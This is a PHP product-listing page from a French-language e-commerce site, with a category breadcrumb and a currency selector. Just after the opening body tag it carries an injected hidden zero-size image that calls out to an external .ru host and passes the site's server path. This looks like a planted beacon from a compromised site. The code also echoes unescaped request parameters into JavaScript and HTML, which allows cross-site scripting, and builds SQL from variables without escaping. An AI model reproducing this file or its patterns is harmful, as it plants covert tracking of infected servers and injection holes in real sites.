<?php
include('lib/config.php');

// Si la page est appeler directement - genre index par Google
if( !isset($_SESSION['pascadre']) ) {
	$script = "<script language='javascript'>";
	$script .= '	open("'.$entr_url.'/index.php?appel=speciaux_achat.php?appel=produits_list.php?cat='.$_GET['cat'].'","_top" );';
	$script .= "</script>";
	echo $script;
}

$_SESSION['Target'] = 'ACCUEIL'; 

$cat = $_GET['cat'];

if( isset( $_POST['devise']) ) 
	$_SESSION['devise'] = $_POST['devise'];

$_SESSION['TotProd'] = 0;
$prod_filter = array();

$TabPaie =  get_money( "tout" );
$TxCUC_USD = get_TauxVente("CUC"); 
$TXUSD_CAD = get_TauxVente("CAD"); 
$TXUSD_EUR = get_TauxVente("EUR"); 



/************************************************************/
function faire_souscat($upCat){
global $__PARAMS, $handle, $txt, $mysql_base, $prod_filter;

	$sql = "SELECT id FROM $mysql_base.catalogue WHERE parent ='$upCat' AND online = 1";
	
	$sql .=' ORDER BY ordre ASC, '.$_SESSION['langue'].' ASC;';
	
	$result = mysql_query( $sql, $handle );
	if( !$result )
		Message_Erreur( "ERROR", "Erreur accès get_subcats", mysql_errno()." : ".mysql_error()."<br>".$sql  );			
	
	while( $r = mysql_fetch_assoc($result) ) {
		$produits = selectionProduits( $r['id'], null, 1 );
		while( $produit = @mysql_fetch_assoc( $produits ))
			if( !in_array( $produit['id'],$prod_filter ) ) {
				$prod_filter[] = $produit['id'];
				afficher_un_produit( $produit, $r['id'], 3, 'ACCUEIL' );	
			}
		faire_souscat($r['id']);
	} // foreach
	
} // faire_souscat
/************************************************************/

// ******** ENVOI DE L'ENTETE ********************************************************************
echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=produits_list' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='ACCUEIL'>
	</head>
<body bgcolor='#FFFFFF' width='$LargeAchat' align='$Enligne'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table width='$LargeAchat' cellpadding='0' cellspacing='2' align='$Enligne' border='1' valign=top >
		<tr>
			<td  align=left nowrap>";


// ******  DÉBUT DE L'AFFICHAGE DU PATH **********************************************************
// ******   EN HAUT DE LA PAGE 
if( $__PARAMS['path_show_main'] == 1 ){
	echo "
			<table width='$LargeAchat' cellpadding='2' cellspacing='0' height='22' border='1' >
				<tr>
					<td  align=left nowrap background='images/bg_main_haut.jpg'>
						&nbsp;&nbsp;<a href='speciaux.php' class=titre>".$txt['accueil']."</a> - ";
					if( $cat != 0 ){
						$path = get_cat_path($cat);
						$subCatCtr = count($path);
						
						if( $subCatCtr > 0 ){
							echo "<span class=titre><a href='produits_list.php?cat=".$path[0]."'  class=titre>".get_cat_name_by_id($path[0]),"</a>";
				      	if( $subCatCtr > 1 ) {
				         	for($i = 1; $i < $subCatCtr; $i++ )
				            	echo "<span  class=titre><a href='produits_list.php?cat=".$path[$i]."' class=titre>".get_cat_name_by_id($path[$i])."</a>";
				    		} // Si $subCatCtr > 0
				  		}	 // $subCatCtr > 0 
				    	echo " > <span class=titre><a href='produits_list.php?cat=".$_GET['cat']."' class=titre>".get_cat_name_by_id($_GET['cat'])."</a>";
					} // si $cat != 0
echo '
		   		</td>
				</tr>
		   </table>  
			</td>
		</tr>
		<tr>
			<td  align="right" nowrap>';

} // ******** FIN DE L'AFFICHAGE DU PATH 

// ******  DÉBUT DE L'AFFICHAGE DE LA DEVISE *******************************************************
// ******   EN HAUT DE LA PAGE 2IEME LIGNE A DROITE
?>
				<form name='RenewPanier' action='' method='post' >
					<b><?=$txt['afficher_prix_en_devise']?></b>
					<select class='s2' name='devise' onchange='document.RenewPanier.submit()'>
<?php
				for($i=0;$i<sizeof($TabPaie);$i++) {
					echo "<option value='".$TabPaie[$i]."' ";
					if( $_SESSION['devise'] == $TabPaie[$i] ) echo " SELECTED";
					echo " >".$TabPaie[$i];
				} // for $i
?>
					</select>
				</form>
<?php
// ******  FIN DE L'AFFICHAGE DE LA DEVISE *********************************************************

$Prod_In_Cat = check_prod_into_cat_complete($cat);

if( !$__PARAMS['categorie_affichage'] || !$Prod_In_Cat ) {

	echo '
				<center>'.
					$txt['Aucun_produit_cat'].'
				</center>
			</td>
		</tr>
	</table>';
	
} // Si pas de produit dans cat
else {
	echo "<table bgcolor='#ffffff' border='1' width='100%' cellspacing=0 align='left' cellpadding=0>";

	if( $__PARAMS['categorie_affichage'] && $Prod_In_Cat ){
		$produits = selectionProduits($cat, null, 1);
		while( $produit = @mysql_fetch_assoc( $produits ))
			if( !in_array( $produit['id'],$prod_filter ) ) {
				$prod_filter[] = $produit['id'];
				afficher_un_produit( $produit, $cat, 3, 'ACCUEIL' );	
			}
		faire_souscat($cat);
	} // Sinon produit dans cat


	echo '
				</table>
			</td>
		</tr>
	</table>';

//	echo 'Produit Total : '.$_SESSION['TotProd'];
} // sinon produit dans cat

?>
<script language='JavaScript1.2'>

function Rafraichie(){
	window.location.reload();
//		 str = 'produits_list.php?cat=<?=$cat?>'; 
//		 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
}

function VoirZoom(No){
		str = 'zoom.php?id=' + No;
		 open( str, '_blank','left=10,top=10,width=460,height=500,status=no,toolbar=no,menubar=no,location=no,resizable=no' );
} // Rafraichie

</script>

</body>
</html>
